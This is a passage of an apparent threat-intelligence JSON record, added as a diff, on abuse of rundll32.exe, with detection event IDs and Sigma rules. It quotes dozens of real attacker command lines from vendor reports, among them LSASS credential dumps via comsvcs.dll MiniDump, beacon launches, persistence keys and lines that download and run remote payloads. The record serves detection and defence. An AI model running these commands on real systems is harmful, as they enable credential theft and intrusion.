+        "description": "USBferry can execute rundll32.exe in memory to avoid detection.",
+        "sources": "TrendMicro Tropic Trooper May 2020 https://documents.trendmicro.com/assets/Tech-Brief-Tropic-Trooper-s-Back-USBferry-Attack-Targets-Air-gapped-Environments.pdf"
+      },
+      {
+        "name": "Winnti for Windows",
+        "attack_id": "S0141",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "The Winnti for Windows installer loads a DLL using rundll32.",
+        "sources": "Microsoft Winnti Jan 2017 https://blogs.technet.microsoft.com/mmpc/2017/01/25/detecting-threat-actors-in-recent-german-industrial-attacks-with-windows-defender-atp/; Novetta Winnti April 2015 https://web.archive.org/web/20150412223949/http://www.novetta.com/wp-content/uploads/2015/04/novetta_winntianalysis.pdf"
+      },
+      {
+        "name": "ZxShell",
+        "attack_id": "S0412",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "ZxShell has used rundll32.exe to execute other DLLs and named pipes.",
+        "sources": "Talos ZxShell Oct 2014 https://blogs.cisco.com/security/talos/opening-zxshell"
+      }
+    ],
+    "associated_tools": [
+      {
+        "name": "Koadic",
+        "attack_id": "S0250",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Koadic can use Rundll32 to execute additional payloads.",
+        "sources": "Github Koadic https://github.com/offsecginger/koadic"
+      },
+      {
+        "name": "PcShare",
+        "attack_id": "S1050",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "PcShare has used `rundll32.exe` for execution.",
+        "sources": "Bitdefender FunnyDream Campaign November 2020 https://www.bitdefender.com/files/News/CaseStudies/study/379/Bitdefender-Whitepaper-Chinese-APT.pdf"
+      }
+    ],
+    "technique_only": [],
+    "associated_commands": [
+      {
+        "command": "C:\\Windows\\System32\\rundll32.exe c:\\windows\\system32\\advpack.dll,RegisterOCX BOOM.exe",
+        "intent": "Target of the NV.lnk shortcut: uses advpack.dll to proxy execution of the hidden BOOM.exe.",
+        "status": "verified",
+        "source_name": "Microsoft NOBELIUM Early-Stage Toolset May 2021",
+        "source_url": "https://www.microsoft.com/en-us/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/"
+      },
+      {
+        "command": "rundll32.exe \"C:\\Windows\\twain_64.dll\"",
+        "intent": "Run FANCY BEAR's X-Agent malware (twain_64.dll) during the intrusion at the Democratic National Committee.",
+        "status": "verified",
+        "source_name": "CrowdStrike DNC June 2016",
+        "source_url": "https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/"
+      },
+      {
+        "command": "rundll32 C:\\ProgramData\\PShdll35.dll,main -f C:\\ProgramData\\doutlook.ps1",
+        "intent": "Run a PowerShell Outlook credential dumper through PowerShdll, which runs PowerShell without powershell.exe, to get around PowerShell restrictions.",
+        "status": "verified",
+        "source_name": "Cybereason Cobalt Kitty 2017",
+        "source_url": "https://cdn2.hubspot.net/hubfs/3354902/Cybereason%20Labs%20Analysis%20Operation%20Cobalt%20Kitty.pdf"
+      },
+      {
+        "command": "cmd.exe /c “C:\\Windows\\System32\\rundll32.exe “C:\\Sun\\Thumbs.db”,#1 CAIAABBmAAAgAAAA8GFGvkHVGDtGRqcl3Z3nYJ9aXCm7TVZX8klEdjacOSU=”",
+        "intent": "Run the GreyEnergy DLL in memory through rundll32, launched as SYSTEM with PsExec.",
+        "status": "verified",
+        "source_name": "ESET GreyEnergy Oct 2018",
+        "source_url": "https://www.welivesecurity.com/wp-content/uploads/2018/10/ESET_GreyEnergy.pdf"
+      },
+      {
+        "command": "C:\\Windows\\conhost.exe \\%TARGET-HOST% -accepteula -s -d C:\\Windows\\ System32\\rundll32.exe “C:\\Windows\\msvcrt120b.dll”, #1 %TIMEOUT% “USER1:PASSWORD1;USER2:PASSWORD2” “%DECRYPTIONKEY%”",
+        "intent": "Spreading: Moonraker Petya starts itself on remote hosts using a dropped copy of PsExec renamed conhost.exe.",
+        "status": "verified",
+        "source_name": "ESET GreyEnergy Oct 2018",
+        "source_url": "https://www.welivesecurity.com/wp-content/uploads/2018/10/ESET_GreyEnergy.pdf"
+      },
+      {
+        "command": "HKEY_CURRENT_USER \\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\”vert” = “rundll32.exe c:\\windows\\temp\\pvcu.dll , Qszdez”",
+        "intent": "Persistence: a Run key starts the Bisonal DLL with rundll32 at logon.",
+        "status": "verified",
+        "source_name": "Unit 42 Bisonal July 2018",
+        "source_url": "https://researchcenter.paloaltonetworks.com/2018/07/unit42-bisonal-malware-used-attacks-russia-south-korea/"
+      },
+      {
+        "command": "C:\\Windows\\System32\\rundll32.exe C:\\ProgramData\\iconcache.db,SMain S-6-12-2371-68143633-837395-7851",
+        "intent": "Run the decoded DLL installed as C:\\ProgramData\\iconcache.db, a variant of a North Korean remote access trojan.",
+        "status": "verified",
+        "source_name": "CISA MAR-10295134-1.v1 BLINDINGCAN August 2020",
+        "source_url": "https://www.cisa.gov/news-events/analysis-reports/ar20-232a"
+      },
+      {
+        "command": "C:\\Programs\\Microsoft\\MSOffice\\Word.exe\\..\\..\\..\\..\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\shell32.dll,ShellExec_RunDLL C:\\Windows\\System32\\cmd.exe /k certutil -urlcache -split -f hxxp://220.158.216[.]127/MScertificate.exe & MScertificate.exe",
+        "intent": "Download and run a payload, triggered by hidden DDE instructions in a weaponized Word document.",
+        "status": "verified",
+        "source_name": "Palo Alto Sofacy 06-2018",
+        "source_url": "https://researchcenter.paloaltonetworks.com/2018/06/unit42-sofacy-groups-parallel-attacks/"
+      },
+      {
+        "command": "rundll32 C:\\users\\public\\Name-123456.xls,DllRegisterServer",
+        "intent": "Run a Cobalt Strike beacon disguised as an .xls file, on the host already running Brute Ratel, before moving laterally.",
+        "status": "verified",
+        "source_name": "Trend Micro Black Basta October 2022",
+        "source_url": "https://www.trendmicro.com/en_us/research/22/j/black-basta-infiltrates-networks-via-qakbot-brute-ratel-and-coba.html"
+      },
+      {
+        "command": "rundll32.exe \"%APPDATA%\\Microsoft\\WinSupport\\RMC\\mtrcpl.dll\",#1 687474703A2F2F[REDACTED]",
+        "intent": "Run the custom backdoor that Zebrocy's operators made persistent through COM hijacking; the argument is a hex-encoded URL.",
+        "status": "verified",
+        "source_name": "ESET Zebrocy May 2019",
+        "source_url": "https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/"
+      },
+      {
+        "command": "rundll32.exe \"C:\\Users\\user\\AppData\\Local\\cdnver.dll\",#1",
+        "intent": "The loader Trojan writes this line to a batch file (cdnver.bat) to run the embedded SofacyCarberp DLL payload, and persists the batch file through UserInitMprLogonScript.",
+        "status": "verified",
+        "source_name": "Unit 42 Sofacy Attacks Multiple Government Entities February 2018",
+        "source_url": "https://researchcenter.paloaltonetworks.com/2018/02/unit42-sofacy-attacks-multiple-government-entities/"
+      },
+      {
+        "command": "rundll32 c:\\Packages\\Plugins\\Microsoft.Powershell.DSC\\2.77.0.0\\bin\\TelemetryStatus.dll Tk_CreateItemType",
+        "intent": "PowerShell Invoke-Command run on a victim computer in an attempt to execute further instances of the Raindrop loader on other computers in the organization.",
+        "status": "verified",
+        "source_name": "Symantec Raindrop SolarWinds Investigation January 2021",
+        "source_url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/solarwinds-raindrop-malware"
+      },
+      {
+        "command": "rundll32 c:\\windows\\Speech_OneCore\\Engines\\TTS\\en-US\\enUS.Media.dll TkChangeEventWindow",
+        "intent": "Invoke-WMIMethod win32_process create run on a victim computer in an attempt to execute further instances of the Raindrop loader on additional computers.",
+        "status": "verified",
+        "source_name": "Symantec Raindrop SolarWinds Investigation January 2021",
+        "source_url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/solarwinds-raindrop-malware"
+      },
+      {
+        "command": "rundll32 C:\\PerfLogs\\arti64.dll, StartW",
+        "intent": "WMI was used (WMIC /node: process call create) to execute a DLL laterally during the Bazar/Ryuk intrusion.",
+        "status": "verified",
+        "source_name": "The DFIR Report Ryuk's Return October 2020",
+        "source_url": "https://thedfirreport.com/2020/10/08/ryuks-return/"
+      },
+      {
+        "command": "rundll32 C:\\Windows\\system32\\SQL.dll, StartW",
+        "intent": "On the first domain controller the threat actors reached, they dropped a DLL and executed it via rundll32 (defense evasion).",
+        "status": "verified",
+        "source_name": "The DFIR Report Ryuk in 5 Hours October 2020",
+        "source_url": "https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/"
+      },
+      {
+        "command": "rundll32.exe c:\\windows\\system32\\comsvcs.dll MiniDump 900 c:\\inetpub\\wwwroot\\aspnet_client\\<REDACTED_33_CHARACTER_STRING>.tmp.dmp full",
+        "intent": "Process memory was dumped with comsvcs.dll MiniDump from the Exchange web shell directory, and the dump was then compressed with makecab.",
+        "status": "verified",
+        "source_name": "Rapid7 Post-Exploitation of Microsoft Exchange Zero-Days March 2021",
+        "source_url": "https://www.rapid7.com/blog/post/2021/03/23/defending-against-the-zero-day-analyzing-attacker-behavior-post-exploitation-of-microsoft-exchange/"
+      },
+      {
+        "command": "rundll32 c:\\programdata\\demo.dll,run -lm > c:\\programdata\\1.txt",
+        "intent": "Runs demo.dll, believed to have functionality similar to mimikatz, and redirects the output to a text file.",
+        "status": "verified",
+        "source_name": "Rapid7 Post-Exploitation of Microsoft Exchange Zero-Days March 2021",
+        "source_url": "https://www.rapid7.com/blog/post/2021/03/23/defending-against-the-zero-day-analyzing-attacker-behavior-post-exploitation-of-microsoft-exchange/"
+      },
+      {
+        "command": "rundll32.exe C:\\windows\\System32\\comsvcs.dll MiniDump <Process ID> C:\\Windows\\Temp\\TS_<REDACTED>.tmp full",
+        "intent": "Credential dumping on a guest machine: MiniDump of process memory, then a PowerShell script parsed the dump for cleartext credentials.",
+        "status": "verified",
+        "source_name": "Mandiant ESXi Hypervisors Malware Persistence September 2022",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-malware-persistence"
+      },
+      {
+        "command": "rundll32.exe C:\\Users\\Public\\libcurl.dll,#52",
+        "intent": "Macro command that reg-adds a Run key value (CurlUpdate) to establish persistence for the Libcurl.dll loader.",
+        "status": "verified",
+        "source_name": "Proofpoint LookBack Malware Targets US Utilities Sector August 2019",
+        "source_url": "https://www.proofpoint.com/us/threat-insight/post/lookback-malware-targets-united-states-utilities-sector-phishing-attacks"
+      },
+      {
+        "command": "rundll32.exe teas.dll,kXlNkCKgFC",
+        "intent": "An LNK file in the ISO attachment loaded the Bumblebee DLL with rundll32.exe after a spear-phishing email.",
+        "status": "verified",
+        "source_name": "Symantec Bumblebee Loader June 2022",
+        "source_url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/bumblebee-loader-cybercrime"
+      },
+      {
+        "command": "rundll32.exe CSIDL_COMMON_APPDATA\\2429189468.dll,start \\shareall \\nolog",
+        "intent": "Bumblebee dropped the Quantum ransomware, and the attacker used a DLL payload run through rundll32 to encrypt files.",
+        "status": "verified",
+        "source_name": "Symantec Bumblebee Loader June 2022",
+        "source_url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/bumblebee-loader-cybercrime"
+      },
+      {
+        "command": "rundll32.exe C:\\Windows\\system32\\ms.dll,ms",
+        "intent": "Rundll32.exe was used to execute ms.dll on the machine (ps.dll on some machines), run from a batch file written to %TEMP%.",
+        "status": "verified",
+        "source_name": "Trend Micro Earth Kapre (RedCurl) March 2024",
+        "source_url": "https://www.trendmicro.com/en_us/research/24/c/unveiling-earth-kapre-aka-redcurls-cyberespionage-tactics-with-t.html"
+      },
+      {
+        "command": "rundll32.exe %Profile%\\update.dll,#1 5pOygIlrsNaAYqx8JNZSTouZNjo+j5XEFHzxqIIqpQ==",
+        "intent": "The fetched payload saved as update.dll is spawned with this command.",
+        "status": "verified",
+        "source_name": "Securelist BlueNoroff Methods to Bypass Mark-of-the-Web December 2022",
+        "source_url": "https://securelist.com/bluenoroff-methods-bypass-motw/108383/"
+      },
+      {
+        "command": "C:\\Windows\\system32\\rundll32.exe \"%APPDATA%\\cnagnt.dll\",Sd",
+        "intent": "Target of the Conime.lnk shortcut written to the startup folder, so rundll32 loads the Comnie DLL at logon.",
+        "status": "verified",
+        "source_name": "Unit 42 Comnie Continues to Target Organizations in East Asia January 2018",
+        "source_url": "https://researchcenter.paloaltonetworks.com/2018/01/unit42-comnie-continues-target-organizations-east-asia/"
+      },
+      {
+        "command": "rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump 600 C:\\asm\\appdata\\local\\microsoft\\windows\\winupd.log full",
+        "intent": "PowerShell was used to dump credentials from the compromised machine.",
+        "status": "verified",
+        "source_name": "Symantec Ukraine Disk-wiping Attacks February 2022",
+        "source_url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia"
+      },
+      {
+        "command": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id C:\\windows\\temp\\ssasl.pmd full | out-host",
+        "intent": "LSASS was dumped to disk as ssasl.pmd (lsass.dmp reversed) and then zipped before exfiltration.",
+        "status": "verified",
+        "source_name": "The DFIR Report APT35 Automates Initial Access Using ProxyShell March 2022",
+        "source_url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+      },
+      {
+        "command": "C:\\windows\\system32\\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\\windows\\system32\\msiexec.exe /Z c:\\programdata\\S-1-5-18.dat",
+        "intent": "Action of a modified scheduled task (Figure 10) that APT41 used for binary execution.",
+        "status": "verified",
+        "source_name": "Mandiant APT41 and US State Governments March 2022",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/apt41-us-state-governments"
+      },
+      {
+        "command": "rundll32.exe SafeStore.dll,epaas_request_clone",
+        "intent": "The DLL variant of the credential harvester is executed by a command like this example.",
+        "status": "verified",
+        "source_name": "Rapid7 Black Basta Ransomware Campaign December 2024",
+        "source_url": "https://www.rapid7.com/blog/post/2024/12/04/black-basta-ransomware-campaign-drops-zbot-darkgate-and-custom-malware/"
+      },
+      {
+        "command": "Rundll32.exe SHELL32.DLL,ShellExec_RunDLL \"C:\\Users\\Public\\Libraries\\active_desktop\\desktop_launcher.exe\"",
+        "intent": "Run key value added with reg add to establish persistence for the dropped EXE (LoLBAS usage).",
+        "status": "verified",
+        "source_name": "Talos Mustang Panda Targets Europe May 2022",
+        "source_url": "https://blog.talosintelligence.com/mustang-panda-targets-europe/"
+      },
+      {
+        "command": "rundll32.exe %APPDATA\\Roaming\\Microsoft\\kxwn.lock , #2",
+        "intent": "Persistence for the primary PowerDuke backdoor loader through the HKCU Run key value WebCache.",
+        "status": "verified",
+        "source_name": "Volexity PowerDuke Post-Election Spear Phishing November 2016",
+        "source_url": "https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/"
+      },
+      {
+        "command": "rundll32.exe \"C:\\Users\\USERNAME\\AppData\\Local\\Temp\\skull-x64.dat\",update /i:\"DwarfWing\\license.dat\"",
+        "intent": "Execution of the IcedID malware after it was downloaded to the host.",
+        "status": "verified",
+        "source_name": "The DFIR Report Sodinokibi (REvil) Ransomware March 2021",
+        "source_url": "https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/"
+      },
+      {
+        "command": "RUNDLL32.EXE SHELL32.DLL,ShellExec_RunDLL REGSVR32.EXE -U /s \"C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\dpcw.etl.\"",
+        "intent": "Roshtyak's core is executed with this command line, which loads the DLL through regsvr32 with an odd extension.",
+        "status": "verified",
+        "source_name": "Avast Raspberry Robin Roshtyak September 2022",
+        "source_url": "https://decoded.avast.io/janvojtesek/raspberry-robins-roshtyak-a-little-lesson-in-trickery/"
+      },
+      {
+        "command": "C:\\Windows\\System32\\rundll32.exe dar.dll,DllRegisterServer",
+        "intent": "Command line in the properties of document.lnk, launched when the user opened the lure, which executed the IcedID payload.",
+        "status": "verified",
+        "source_name": "The DFIR Report Quantum Ransomware April 2022",
+        "source_url": "https://thedfirreport.com/2022/04/25/quantum-ransomware/"
+      },
+      {
+        "command": "rundll32.exe [%LOCALAPPDATA%\\MicroSoft UpdateServices\\Services.dll] install",
+        "intent": "After the DLL is written, the malware loads it with this command line.",
+        "status": "verified",
+        "source_name": "Unit 42 New KONNI Malware Attacking Eurasia and Southeast Asia September 2018",
+        "source_url": "https://researchcenter.paloaltonetworks.com/2018/09/unit42-new-konni-malware-attacking-eurasia-southeast-asia/"
+      },
+      {
+        "command": "Rundll32.exe C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\Remdisk.dll,DllRegister",
+        "intent": "Run key value that runs the functional code within Emissary through the exported function DllRegister.",
+        "status": "verified",
+        "source_name": "Unit 42 Emissary Trojan Changelog February 2016",
+        "source_url": "http://researchcenter.paloaltonetworks.com/2016/02/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/"
+      },
+      {
+        "command": "rundll32.exe dialogex.dll,fackaaxv",
+        "intent": "First observed use: execution with rundll32.exe explicitly calling the DLL export fackaaxv.",
+        "status": "verified",
+        "source_name": "Red Canary Blue Mockingbird Cryptominer May 2020",
+        "source_url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/"
+      },
+      {
+        "command": "rundll32.exe C:\\Users\\REM\\AppData\\Roaming\\-632116337\\-456638727.dll,init -zzzz=\"-632116337\\1431684209.dat\"",
+        "intent": "Observed command line used by LATRODECTUS to execute the downloaded ICEDID loader and encrypted payload together.",
+        "status": "verified",
+        "source_name": "Elastic Security Labs Spring Cleaning with LATRODECTUS May 2024",
+        "source_url": "https://www.elastic.co/security-labs/spring-cleaning-with-latrodectus"
+      },
+      {
+        "command": "rundll32.exe \"C:\\Documents and Settings\\Administrator\\Application Data\\Identities\\Identities.ocx\" SSSS",
+        "intent": "Value of the Winlogon Shell registry key created for persistence, which launches the Identities.ocx payload and calls its SSSS export.",
+        "status": "verified",
+        "source_name": "Unit 42 Tropic Trooper Targets Taiwanese Government November 2016",
+        "source_url": "https://researchcenter.paloaltonetworks.com/2016/11/unit42-tropic-trooper-targets-taiwanese-government-and-fossil-fuel-provider-with-poison-ivy/"
+      },
+      {
+        "command": "%WINDIR%\\system32\\rundll32.exe UsrClass.dat{4f6fe187-7034-11de-b675-001d09fa5win}.dll,updater",
+        "intent": "Target of the UsrClass.lnk shortcut, pointing at the copied winrestore.dll.",
+        "status": "verified",
+        "source_name": "Unit 42 Gamaredon Group Toolset Evolution February 2017",
+        "source_url": "https://researchcenter.paloaltonetworks.com/2017/02/unit-42-title-gamaredon-group-toolset-evolution/"
+      },
+      {
+        "command": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 968 C:\\ProgramData\\REDACTED\\lsass.dmp full",
+        "intent": "Threat actors dumped LSASS from the beachhead with the comsvcs.dll MiniDump technique.",
+        "status": "verified",
+        "source_name": "The DFIR Report Bumblebee Roasts Its Way to Domain Admin August 2022",
+        "source_url": "https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/"
+      },
+      {
+        "command": "rundll32 namr.dll,IternalJob",
+        "intent": "Command line in the document.lnk inside the ISO that executes the malicious BumbleBee DLL loader.",
+        "status": "verified",
+        "source_name": "The DFIR Report Bumblebee Roasts Its Way to Domain Admin August 2022",
+        "source_url": "https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/"
+      },
+      {
+        "command": "rundll32.exe tamirlan.dll,EdHVntqdWt",
+        "intent": "The documents.lnk instructs rundll32 to execute a specific exported function of the BumbleBee DLL.",
+        "status": "verified",
+        "source_name": "The DFIR Report Bumblebee Round Two September 2022",
+        "source_url": "https://thedfirreport.com/2022/09/26/bumblebee-round-two/"
+      },
+      {
+        "command": "rundll32.exe C:\\ProgramData\\n23.dll,AddProgram",
+        "intent": "Used for lateral movement over SMB: n23.dll (Cobalt Strike) was copied to C:\\ProgramData and launched via a new service.",
+        "status": "verified",
+        "source_name": "The DFIR Report Bumblebee Zeros in on Meterpreter November 2022",
+        "source_url": "https://thedfirreport.com/2022/11/14/bumblebee-zeros-in-on-meterpreter/"
+      },
+      {
+        "command": "rundll32.exe C:\\windows\\192145.dll,StartW",
+        "intent": "Cobalt Strike Beacon DLL copied to ADMIN$ and distributed through the environment with PsExec.",
+        "status": "verified",
+        "source_name": "The DFIR Report Conti Ransomware May 2021",
+        "source_url": "https://thedfirreport.com/2021/05/12/conti-ransomware/"
+      },
+      {
+        "command": "rundll32.exe c:\\programdata\\95.dll,TstSec 11985756",
+        "intent": "Later in the intrusion, the threat actor used this command to execute a Cobalt Strike Beacon on another machine.",
+        "status": "verified",
+        "source_name": "The DFIR Report Hancitor Continues to Push Cobalt Strike June 2021",
+        "source_url": "https://thedfirreport.com/2021/06/28/hancitor-continues-to-push-cobalt-strike/"
+      },
+      {
+        "command": "rundll32.exe C:\\programdata\\microsoft\\sysfunc.dll,run /target=C:\\programdata\\microsoft\\WPD",
+        "intent": "Command line shown in the Dagon Locker output when the ransomware DLL was run against the target path.",
+        "status": "verified",
+        "source_name": "The DFIR Report From IcedID to Dagon Locker Ransomware in 29 Days April 2024",
+        "source_url": "https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/"
+      },
+      {
+        "command": "rundll32.exe C:\\ProgramData\\x86.dll, StartA",
+        "intent": "Remote services were created to execute Cobalt Strike beacon DLL files transferred via SMB as SYSTEM on remote hosts.",
+        "status": "verified",
+        "source_name": "The DFIR Report Emotet Strikes Again, LNK File Leads to Domain Wide Ransomware November 2022",
+        "source_url": "https://thedfirreport.com/2022/11/28/emotet-strikes-again-lnk-file-leads-to-domain-wide-ransomware/"
+      },
+      {
+        "command": "\"C:\\windows\\System32\\rundll32.exe\" C:\\windows\\System32\\comsvcs.dll MiniDump C:\\windows\\temp\\logctl.zip full",
+        "intent": "The threat actor dumped LSASS using comsvcs.dll, using the LSASS PID from tasklist output.",
+        "status": "verified",
+        "source_name": "The DFIR Report Will the Real Msiexec Please Stand Up June 2022",
+        "source_url": "https://thedfirreport.com/2022/06/06/will-the-real-msiexec-please-stand-up-exploit-leads-to-data-exfiltration/"
+      },
+      {
+        "command": "rundll32.exe 1.dll, DllRegisterServer",
+        "intent": "After 1.dll (Cobalt Strike) was transferred to a domain controller, it was executed with this command.",
+        "status": "verified",
+        "source_name": "The DFIR Report HTML Smuggling Leads to Domain Wide Ransomware August 2023",
+        "source_url": "https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/"
+      },
+      {
+        "command": "rundll32.exe C:\\Users\\redacted\\AppData\\Local\\Temp\\wsuC3C.tmp,ControlUnitSpeed",
+        "intent": "The threat actor executed a second Cobalt Strike Beacon (wsuC3C.tmp) using the injected wermgr.exe process.",
+        "status": "verified",
+        "source_name": "The DFIR Report Trickbot Brief: Creds and Beacons May 2021",
+        "source_url": "https://thedfirreport.com/2021/05/02/trickbot-brief-creds-and-beacons/"
+      },
+      {
+        "command": "C:\\windows\\system32\\rundll32.exe \"C:\\ProgramData\\ThumbNail\\thumbnail.db\", CtrlPanel S-6-81-3811-75432205-060098-6872 0 0 905 1",
+        "intent": "The downloaded DLL is executed with rundll32.exe, like the persistence process that sets the unload path using the CtrlPanel function.",
+        "status": "verified",
+        "source_name": "ClearSky Operation Dream Job August 2020",
+        "source_url": "https://www.clearskysec.com/wp-content/uploads/2020/08/Dream-Job-Campaign.pdf"
+      },
+      {
+        "command": "\"C:\\Windows\\system32\\rundll32.exe\" \\\\94.159.113[.]48@8888\\davwwwroot\\157161090119030.dll,Entry",
+        "intent": "Obfuscated scripts ran a PowerShell command to connect to a WebDAV server and download and execute a crypted DLL.",
+        "status": "verified",
+        "source_name": "IBM X-Force Strela Stealer April 2025",
+        "source_url": "https://securityintelligence.com/x-force/strela-stealer-todays-invoice-tomorrows-phish/"
+      }
+    ]
+  },
+  "detections": {
+    "eventsid": [
+      {
+        "log": "WinEventLog:Security",
+        "event_id": 4672,
+        "data_components": "Logon Session Metadata",
+        "techniques": "T1548.002"
+      },
+      {
+        "log": "WinEventLog:Security",
+        "event_id": 4673,
+        "data_components": "User Account Metadata",
+        "techniques": "T1003.001"
+      },
+      {
+        "log": "WinEventLog:Security",
+        "event_id": 4688,
+        "data_components": "Process Creation",
+        "techniques": "T1548.002, T1555.004"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 1,
+        "data_components": "Process Creation",
+        "techniques": "T1218.011, T1003.001"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 3,
+        "data_components": "Network Connection Creation",
+        "techniques": "T1218.011"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 7,
+        "data_components": "Module Load",
+        "techniques": "T1218.011, T1548.002"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 10,
+        "data_components": "Process Access",
+        "techniques": "T1548.002, T1555.004, T1003.001"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 11,
+        "data_components": "File Creation",
+        "techniques": "T1218.011, T1003.001"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 13,
+        "data_components": "Windows Registry Key Modification",
+        "techniques": "T1548.002, T1003.001"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 14,
+        "data_components": "Windows Registry Key Modification",
+        "techniques": "T1548.002, T1003.001"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 15,
+        "data_components": "File Metadata",
+        "techniques": "T1555.004"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 22,
+        "data_components": "Network Connection Creation",
+        "techniques": "T1218.011"
+      }
+    ],
+    "sigma_rules": [
+      {
+        "title": "Potential Emotet Rundll32 Execution",
+        "level": "critical",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2020/Malware/Emotet/proc_creation_win_malware_emotet_rundll32_execution.yml"
+      },
+      {
+        "title": "Injected Browser Process Spawning Rundll32 - GuLoader Activity",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2023/Malware/GuLoader/proc_creation_win_malware_guloader_execution.yml"
+      },
+      {
+        "title": "IcedID Malware Suspicious Single Digit DLL Execution Via Rundll32",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2023/Malware/IcedID/proc_creation_win_malware_icedid_rundll32_dllregisterserver.yml"
+      },
+      {
+        "title": "Pikabot Fake DLL Extension Execution Via Rundll32.EXE",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2023/Malware/Pikabot/proc_creation_win_malware_pikabot_rundll32_uncommon_extension.yml"
+      },
+      {
+        "title": "Potential Qakbot Rundll32 Execution",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2023/Malware/Qakbot/proc_creation_win_malware_qakbot_rundll32_execution.yml"
+      },
+      {
+        "title": "Qakbot Rundll32 Exports Execution",
+        "level": "critical",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2023/Malware/Qakbot/proc_creation_win_malware_qakbot_rundll32_exports.yml"
+      },
+      {
+        "title": "Qakbot Rundll32 Fake DLL Extension Execution",
+        "level": "critical",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2023/Malware/Qakbot/proc_creation_win_malware_qakbot_rundll32_fake_dll_execution.yml"
+      },
+      {
+        "title": "Rhadamanthys Stealer Module Launch Via Rundll32.EXE",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2023/Malware/Rhadamanthys/proc_creation_win_malware_rhadamanthys_stealer_dll_launch.yml"
+      },
+      {
+        "title": "Potential Raspberry Robin CPL Execution Activity",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2024/Malware/Raspberry-Robin/proc_creation_win_malware_raspberry_robin_rundll32_shell32_cpl_exection.yml"
+      },
+      {
+        "title": "Kapeka Backdoor Loaded Via Rundll32.EXE",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2024/Malware/kapeka/image_load_malware_kapeka_backdoor_wll.yml"
+      },
+      {
+        "title": "Kapeka Backdoor Execution Via RunDLL32.EXE",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2024/Malware/kapeka/proc_creation_win_malware_kapeka_backdoor_rundll32_execution.yml"
+      },
+      {
+        "title": "DLL Call by Ordinal Via Rundll32.EXE",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/process_creation/proc_creation_win_rundll32_by_ordinal.yml"
+      },
+      {
+        "title": "Rundll32.EXE Calling DllRegisterServer Export Function Explicitly",
+        "level": "medium",
